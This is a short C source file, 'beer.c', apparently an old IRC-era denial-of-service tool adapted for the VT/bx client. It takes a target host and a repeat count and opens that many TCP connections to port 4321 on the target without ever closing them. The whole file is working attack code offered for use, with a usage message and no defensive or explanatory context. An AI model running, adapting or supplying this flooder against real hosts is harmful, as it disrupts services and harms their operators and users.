#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

void beer(char *server, int port);
void alcohol(char *host, int loop);

beer_main(int argc, char **argv) {
   if (argc != 3) {
      printf("beer.c by ???\n");
      printf("Edited, and made for use with VT/bx by Cyranix0r\n");
      printf("Usage: %s <host> <times>\n");
   } else {
      alcohol(argv[1], atoi(argv[2]));
   }
}
 
void beer(char *server, int port) {
   struct sockaddr_in sin;
   struct hostent *hp;
   int thesock;
   hp = gethostbyname(server);
   if (hp == NULL) {
      printf("unknown host: %s\n", server);
      exit(1);
   }
   bzero((char*) &sin, sizeof(sin));
   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
   sin.sin_family = hp->h_addrtype;
   sin.sin_port = htons(port);
   thesock = socket(AF_INET, SOCK_STREAM, 0);
   connect(thesock, (struct sockaddr *) &sin, sizeof(sin));
}

void alcohol(char *host, int loop) {
   int i;
   for(i = 0; i < loop; i++) {
      beer(host, 4321);
   }
}


   
